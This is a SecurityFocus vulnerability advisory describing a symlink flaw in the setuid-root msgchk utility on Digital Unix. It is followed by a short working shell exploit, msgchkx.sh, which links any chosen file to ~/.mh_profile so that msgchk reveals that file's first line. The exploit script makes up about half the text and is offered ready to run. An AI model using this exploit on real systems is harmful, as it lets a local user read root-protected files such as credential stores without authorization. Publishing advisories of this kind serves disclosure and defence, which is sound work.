source: http://www.securityfocus.com/bid/3320/info

The msgchk utility under certain versions of Digital Unix contains an information disclosure vulnerability which could yield root privilege.

Because msgchk fails to check file permissions before opening user configuration files in the user's home directory, a symbolic link to a target file can permit a local user to read the first line of data contained in any file readable by the msgchk user. Where msgchk is run setuid root, this allows limited information to be read from any file on the host. 

++ msgchkx.sh
#!/bin/sh
# truefinder, seo@igrus.inha.ac.kr
# msgchk file read vulnerability

if [ ! -f $1 ]
then
	echo "usage : $0 <file path>"
fi

cd ~
ln -sf $1 ~/.mh_profile
/usr/bin/mh/msgchk